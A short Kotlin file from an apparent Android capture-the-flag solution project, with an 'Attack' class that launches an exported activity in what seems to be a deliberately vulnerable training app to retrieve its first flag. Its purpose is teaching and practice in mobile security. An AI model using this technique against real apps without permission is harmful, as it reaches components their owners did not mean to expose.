package com.vishal2376.hextreepoc

import android.content.Context
import android.content.Intent
import android.provider.ContactsContract.Directory.PACKAGE_NAME

/**
 * Author: Vishal Singh (vishal2376)
 */

class Attack(private val context: Context) {

	private val packageName = "io.hextree.attacksurface"

	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		context.startActivity(intent)
	}
}
